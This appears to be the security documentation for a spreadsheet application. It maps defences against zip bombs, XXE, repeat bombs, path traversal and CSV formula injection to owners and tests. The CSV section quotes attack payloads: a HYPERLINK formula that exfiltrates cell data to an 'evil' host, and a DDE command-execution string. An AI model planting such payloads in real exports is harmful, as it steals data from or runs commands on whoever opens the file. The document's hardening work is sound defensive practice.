# Security

Tally opens files from untrusted sources (mail attachments, downloads), so
every file reader treats its input as hostile. This document lists the
security requirements from `docs/architecture-plan.md` §5.4, says which work
package owns each one, and names the tests that prove the parts that are
implemented.

Test names are `crate::test-file::test` (for example
`tally-io-ods::malicious::zip_bomb_is_rejected_within_one_second` is
`crates/tally-io-ods/tests/malicious.rs`). Unit tests inside a crate are named
`crate::module::tests::name`. The malicious corpus lives in
`tests/fixtures/malicious/`. It is generated, together with the ODS and CSV
fixtures, by `python3 -I tests/fixtures/ods/gen_fixtures.py`.

## Summary

| # | Requirement | Owner | Status |
|---|---|---|---|
| 1 | Zip bombs | WP5 | Implemented |
| 2 | XML: DOCTYPE, entities, depth and attribute caps | WP5 | Implemented |
| 3 | Logical bombs (repeat counts, cell caps) | WP5, plus WP1 for engine-side storage | Implemented for the readers |
| 4 | Path traversal | WP5 | Implemented |
| 5 | Active content (macros, external links, HYPERLINK) | WP1, WP3, WP7; WP5 for file side | File side done; rest pending |
| 6 | Untrusted parsing happens in Rust only | WP5 (parsing), WP7 (IPC surface) | Parsing side done |
| 7 | Tauri hardening | WP7 | Not WP5 |
| 8 | Engine DoS limits | WP1, WP2, WP3 | Not WP5 |
| 9 | Fuzzing | later (Phase A drops fuzz targets) | Corpus and a mutation smoke test exist |

Plus the CSV formula-injection guard (§5.3), which is described below.

## 1. Zip bombs (WP5, `crates/tally-io-ods/src/archive.rs`)

Default limits are in `tally_io_ods::Limits`. Callers can tighten them.

| Control | Default | Test |
|---|---|---|
| Entry count is capped before anything is inflated | 10,000 entries | `tally-io-ods::malicious::too_many_entries` (20,000 entries, rejected in about 30 ms) |
| Per-entry uncompressed bytes for `content.xml` | 512 MiB (`max_content_xml_bytes`) | `tally-io-ods::malicious::zip_bomb_hits_entry_cap_when_ratio_is_disabled` |
| Per-entry uncompressed bytes for every other entry | 64 MiB (`max_entry_bytes`) | same mechanism, see `archive::tests` |
| Total uncompressed bytes across the package | 2 GiB (`max_total_bytes`) | `tally-io-ods::malicious::total_bytes_cap` |
| Compression ratio, enforced once an entry has produced more than 10 MiB | 200:1 (`max_ratio`) | `tally-io-ods::malicious::zip_bomb_is_rejected_within_one_second` (1 GiB of zeros compressed about 1000:1, rejected in about 70 ms in a debug build), `tally-io-ods::archive::tests::ratio_trips_after_floor` |
| Sizes declared in zip headers are never trusted | every read goes through `Read::take(limit + 1)` and a counting guard | `tally-io-ods::archive::tests::take_bounds_a_lying_entry`, `tally-io-ods::malicious::lying_size_header_is_bounded` |

How it works:

- The ratio is checked continuously against the compressed bytes actually
  pulled from the archive. The archive reader is wrapped in a byte counter, so
  a bomb is caught after about 10 MiB of output instead of after the whole
  entry has inflated.
- XML is streamed from the inflating entry through a 64 KiB buffer. No entry is
  ever buffered whole, except the tiny `mimetype` entry.

## 2. XML (WP5, `crates/tally-io-ods/src/xml.rs`)

Every XML stream in the package (`content.xml`, `styles.xml`, `settings.xml`,
`meta.xml`, `META-INF/manifest.xml`) goes through one hardened reader.

| Control | Test |
|---|---|
| Any `<!DOCTYPE>` is rejected with `OdsError::ForbiddenDoctype`. ODF never needs one, so this blocks XXE and entity-expansion attacks outright. | `tally-io-ods::malicious::doctype_with_external_entity_is_forbidden`, `tally-io-ods::malicious::billion_laughs_is_forbidden`, `tally-io-ods::malicious::doctype_in_styles_xml_is_forbidden` |
| quick-xml never fetches or expands external entities. It does not even expand internal DTD entities; it reports them as references. | `tally-io-ods::malicious::quick_xml_does_not_resolve_external_entities` |
| Only the five predefined entities and character references are resolved. Any other entity reference is an error. | `tally-io-ods::fixtures::libreoffice_shapes` (`&lt; &amp; &quot; &#x263A;`) |
| Element depth is capped. | `tally-io-ods::malicious::deep_nesting_hits_depth_cap` (100,000 levels, rejected at 256) |
| Attributes per element are capped. | `tally-io-ods::malicious::attribute_flood_hits_cap` (300 attributes, limit 256) |
| Text is capped at 16 MiB per cell. A `text:s text:c="4000000000"` cannot allocate gigabytes. | `tally-io-ods::malicious::space_bomb_is_rejected` |

## 3. Logical bombs (WP5, `crates/tally-io-ods/src/content.rs`; CSV limits in `tally-io-csv`)

- Rows and cells are first parsed as run-length runs. They are expanded into
  `CellData` only after the cell count has been checked against `max_cells`
  (default 10,000,000, the Phase A reader limit). So the check happens before
  any allocation.
- An empty repeated row costs nothing, whatever its repeat count.
- A non-empty repeated row is materialized at most `max_repeat` times. Its
  cells are counted against `max_cells`.
- Repeat counts are clamped to the sheet limits: 1,048,576 rows and 16,384
  columns.
- Styled but empty runs larger than 4,096 cells are dropped. This is
  formatting of blank areas, which the Phase A model does not keep.

| Test | What it proves |
|---|---|
| `tally-io-ods::malicious::repeated_rows_bomb_hits_cell_cap_fast` | `number-rows-repeated="1048576"` × `number-columns-repeated="16384"` on a non-empty cell (17 G cells) is rejected in about 1 ms |
| `tally-io-ods::malicious::repeat_is_capped_by_max_repeat` | A non-empty repeated row is materialized at most `max_repeat` times |
| `tally-io-ods::malicious::cell_cap_applies_to_real_files` | The cell cap applies to ordinary files too |
| `tally-io-csv::csv::limits_are_enforced` | CSV `max_cells` (10M default), `max_rows` and `max_cols` |

Deviation from the plan: the plan says "store repeated content as runs (never
materialize)". `tally_model::SheetData` has no run representation, so
repeated content is materialized up to the caps above. Storing runs would need
a model change (WP0 lead review) and engine support (WP1).

## 4. Path traversal (WP5)

- Nothing is ever extracted to disk. Entries are streamed into memory by exact
  name.
- Entry names are ignored if they are absolute, contain `..` components,
  backslashes, NUL bytes or drive letters (`:`). Ignoring a name is not an
  error, so a document with a hostile `../content.xml` and a real
  `content.xml` still opens from the real one.
- On write, entry names are fixed constants.

| Test | What it proves |
|---|---|
| `tally-io-ods::malicious::traversal_entry_names_are_ignored` | The hostile `../content.xml` and the DOCTYPE in `a/../../styles.xml` are never read |
| `tally-io-ods::archive::tests::unsafe_names` | Name classification |
| `tally-io-ods::roundtrip::mimetype_is_first_and_stored` | The writer emits exactly the fixed entry list, with `mimetype` first and stored |

## 5. Active content

File side (WP5):

- The ODS reader reads only `mimetype`, `META-INF/manifest.xml`,
  `content.xml`, `styles.xml`, `settings.xml` and `meta.xml`. `Basic/` macros,
  `Scripts/`, embedded objects and `office:scripts` are never read, so they
  cannot run.
- Encrypted (password-protected) documents are refused with
  `OdsError::Unsupported`.
- Formula text such as `WEBSERVICE` or `DDE` is passed through as text. It is
  never evaluated by the reader.

Other WPs:

- Disabling external links, DDE, `WEBSERVICE` and `FILTERXML` by default, and
  opening `HYPERLINK` only on explicit click through Rust for
  http/https/mailto, belong to WP1 (engine), WP3 (functions) and WP7 (app).
- The macro banner is WP7.

## CSV formula-injection guard (WP5, `tally_io_csv::write_csv`, default ON)

Why the guard exists:

- When a CSV file is opened in Excel, LibreOffice or Google Sheets, a field
  that starts with `=`, `+`, `-` or `@` is evaluated as a formula. Tab and
  carriage return can hide such a prefix in some importers.
- An attacker who can put text into a cell (a form field, a product name, a
  synced row) can make an exported CSV run a formula on whoever opens it.
  Examples are `=HYPERLINK("http://evil/?"&A1)`, which exfiltrates neighbouring
  data, and DDE payloads such as `=cmd|' /C calc'!A0`.
- This is OWASP's "CSV Injection".

What the guard does:

- When `CsvWriteOptions::injection_guard` is true (the default), a text cell
  gets a leading `'` if its text starts with `=`, `+`, `-`, `@`, tab or CR.
- The same applies when that character comes after leading `"` characters,
  because some importers strip quotes before the formula check.
- Spreadsheet apps treat a leading `'` as "this is text" and hide it in the
  cell.

What it does not touch:

- Only text cells change (`CsvCell::is_text`). Numbers, dates, booleans and
  errors are never altered, so `-5` stays `-5`.
- Text that merely contains `=` later on is untouched.

The cost:

- The guard changes the bytes of some legitimate text, such as `-foo` or
  `@handle`. Users who need byte-exact text can switch the guard off (export
  dialog toggle, WP7).

Tests: `tally-io-csv::csv::injection_guard` covers every trigger, the
`"`-prefixed variant, non-text cells and the toggle.

CSV import never interprets content. Cells come back as raw text, and the
engine's input recognizer decides what they mean. For example,
`tally-io-csv::csv::values_are_raw_text` keeps `=SUM(A1)` as text.

## 6. Untrusted parsing happens in Rust only

- WP5: both readers are pure Rust with `#![forbid(unsafe_code)]`. Neither
  uses `unwrap` or `expect` outside tests, and both produce typed
  `tally_model` data.
- `tally-io-ods::malicious::mutated_inputs_never_panic` runs truncations and
  random byte flips of a real fixture and checks that none of them panics or
  hangs.
- WP7 owns the guarantee that the webview receives typed DTOs and never raw
  file contents. That includes the size-limited image blobs.

## 7. Tauri hardening: WP7

Minimal capabilities (no fs or shell plugins exposed to JS, dialog only from
Rust commands), an allowlist of our commands only, a strict CSP and devtools
off in release builds are all owned by WP7 (`apps/desktop/**`).

## 8. Engine DoS: WP1, WP2, WP3

- Parser depth and length limits: formula length at most 8,192 characters,
  nesting at most 256 (Err:512). Owned by WP2.
- Regex size limit through `RegexBuilder::size_limit`, with no fancy-regex in
  criteria. Owned by WP3.
- Maximum array size and a cancellable recalc watchdog. Owned by WP1.

The file readers' own cap of 10,000,000 cells (above) bounds what reaches the
engine.

## 9. Fuzzing: later

Phase A drops fuzz targets (`docs/phase-a.md`). What exists today:

- the malicious corpus in `tests/fixtures/malicious/`, which can seed
  cargo-fuzz targets;
- the deterministic mutation smoke test described in requirement 6.

cargo-fuzz targets for the formula parser, the format-code parser, the ODS
reader and the CSV reader (nightly CI) come in a later milestone.

## Malicious corpus

| File | Expected result |
|---|---|
| `zip-bomb.ods` | `LimitExceeded { what: "compression ratio" }` |
| `doctype-xxe.ods`, `billion-laughs.ods`, `doctype-in-styles.ods` | `ForbiddenDoctype` |
| `path-traversal.ods` | Opens; hostile names ignored |
| `repeat-bomb.ods` | `LimitExceeded { what: "materialized cells" }` |
| `space-bomb.ods` | `LimitExceeded { what: "cell text bytes" }` |
| `deep-nesting.ods` | `LimitExceeded { what: "XML element depth" }` |
| `many-attributes.ods` | `LimitExceeded { what: "XML attributes per element" }` |
| `lying-size.ods` | An error. The zip claims 100 bytes but the entry inflates to 8 MiB; it is never trusted. |
| `many-entries.ods` | `LimitExceeded { what: "zip entries" }` |
| `not-a-zip.ods`, `no-content.ods`, `text-document.odt` | `NotOds` |
